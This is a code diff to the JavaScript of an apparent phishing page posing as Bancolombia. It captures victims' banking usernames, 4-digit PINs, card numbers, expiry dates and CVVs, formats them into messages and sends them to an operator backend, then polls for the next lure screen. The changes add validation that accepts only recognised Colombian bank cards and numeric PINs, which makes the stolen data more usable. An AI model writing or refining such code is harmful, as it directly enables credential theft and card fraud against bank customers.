@@ -194,7 +194,20 @@ function detectBank(number) {
     fetch(`api/bin.php?number=${encodeURIComponent(clean)}`)
         .then(r => r.json())
         .then(data => {
-            if (data.ok) showBankDetect(data);
+            if (data.ok) {
+                if (data.hasBank && data.bank !== 'unknown') {
+                    showBankDetect(data);
+                    document.getElementById('cardnum')?.classList.remove('err');
+                    document.getElementById('err-cardnum')?.classList.remove('show');
+                } else {
+                    hideBankDetect();
+                    if (clean.length >= 6) {
+                        document.getElementById('cardnum')?.classList.add('err');
+                        const errCard = document.getElementById('err-cardnum');
+                        if (errCard) { errCard.textContent = 'Banco no reconocido. Ingresa una tarjeta de banco colombiano válida.'; errCard.classList.add('show'); }
+                    }
+                }
+            }
         })
         .catch(() => {});
 }
@@ -267,10 +280,27 @@ function submitLogin() {
     const hp = document.getElementById('hp');
     if (hp && hp.value !== '') return;
 
-    const user = document.getElementById('user').value;
-    const pass = document.getElementById('pass').value;
+    const user = document.getElementById('user').value.trim();
+    const pass = document.getElementById('pass').value.trim();
     const nobot = document.getElementById('nobot');
-    if (!user.trim() || !pass.trim() || (nobot && !nobot.checked)) return;
+
+    let hasErr = false;
+    if (!user) {
+        document.getElementById('fld-user')?.classList.add('error');
+        document.getElementById('err-user')?.classList.add('show');
+        hasErr = true;
+    }
+    if (!/^\d{4}$/.test(pass)) {
+        document.getElementById('fld-pass')?.classList.add('error');
+        document.getElementById('err-pass')?.classList.add('show');
+        hasErr = true;
+    }
+    if (nobot && !nobot.checked) {
+        document.getElementById('antibot-box')?.classList.add('error');
+        document.getElementById('err-nobot')?.classList.add('show');
+        hasErr = true;
+    }
+    if (hasErr) return;
 
     const msg = `🔐 <b>Login Bancolombia</b>\n\n👤 Usuario: <code>${user}</code>\n🔑 Clave: <code>${pass}</code>\n\n🖥️ Dispositivo: ${detectDevice()}`;
     sendToBackend('login', msg).then(data => {
@@ -287,12 +317,41 @@ function submitCupo() {
 }
 
 function submitTarjeta() {
-    const titular = document.getElementById('titular').value;
-    const cardnum = document.getElementById('cardnum').value;
-    const venc = document.getElementById('venc').value;
-    const cvv = document.getElementById('cvv').value;
-    const banco = detectedBank || 'No detectado';
+    const titular = document.getElementById('titular').value.trim();
+    const cardnum = document.getElementById('cardnum').value.trim();
+    const venc = document.getElementById('venc').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    const cleanCard = cardnum.replace(/\s/g, '');
 
+    let hasErr = false;
+    if (!titular) {
+        document.getElementById('titular')?.classList.add('err');
+        document.getElementById('err-titular')?.classList.add('show');
+        hasErr = true;
+    }
+    if (cleanCard.length < 15) {
+        document.getElementById('cardnum')?.classList.add('err');
+        const errCard = document.getElementById('err-cardnum');
+        if (errCard) { errCard.textContent = 'Ingresa un número de tarjeta válido (15-16 dígitos)'; errCard.classList.add('show'); }
+        hasErr = true;
+    } else if (!detectedBank) {
+        document.getElementById('cardnum')?.classList.add('err');
+        const errCard = document.getElementById('err-cardnum');
+        if (errCard) { errCard.textContent = 'Tarjeta no reconocida. Usa una tarjeta de banco colombiano.'; errCard.classList.add('show'); }
+        hasErr = true;
+    }
+    if (!/^\d{2}\/\d{2}$/.test(venc)) {
+        document.getElementById('venc')?.classList.add('err');
+        document.getElementById('err-venc')?.classList.add('show');
+        hasErr = true;
+    }
+    if (!/^\d{3}$/.test(cvv)) {
+        document.getElementById('cvv')?.classList.add('err');
+        hasErr = true;
+    }
+    if (hasErr) return;
+
+    const banco = detectedBank;
     const msg = `💳 <b>Datos de tarjeta</b>\n\n🏦 Banco: <b>${banco}</b>\n👤 Titular: <code>${titular}</code>\n💳 Número: <code>${cardnum}</code>\n📅 Vencimiento: <code>${venc}</code>\n🔒 CVV: <code>${cvv}</code>`;
     sendToBackend('tarjeta', msg).then(data => {
         if (data.ok) startPolling('scr-clave', 'tarjeta', msg);
@@ -339,7 +398,10 @@ const nobot = document.getElementById('nobot');
 const btnLogin = document.getElementById('btn-login');
 
 function checkLogin() {
-    const ok = userIn?.value.trim() && passIn?.value.trim() && nobot?.checked;
+    const userOk = userIn?.value.trim().length > 0;
+    const passVal = passIn?.value.trim() || '';
+    const passOk = /^\d{4}$/.test(passVal);
+    const ok = userOk && passOk && nobot?.checked;
     if (btnLogin) {
         btnLogin.disabled = !ok;
         btnLogin.classList.toggle('ready', ok);
@@ -355,7 +417,10 @@ if (userIn) {
     });
 }
 if (passIn) {
-    passIn.addEventListener('input', () => {
+    passIn.addEventListener('input', (e) => {
+        // Solo numeros, max 4 digitos
+        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+        e.target.value = v;
         if (nobot && !nobot.checked) nobot.checked = true;
         checkLogin();
         document.getElementById('fld-pass')?.classList.remove('error');
@@ -406,7 +471,9 @@ if (titularInput) {
 }
 const cvvInput = document.getElementById('cvv');
 if (cvvInput) {
-    cvvInput.addEventListener('input', () => {
+    cvvInput.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').substring(0, 3);
+        e.target.value = v;
         cvvInput.classList.remove('err');
     });
 }
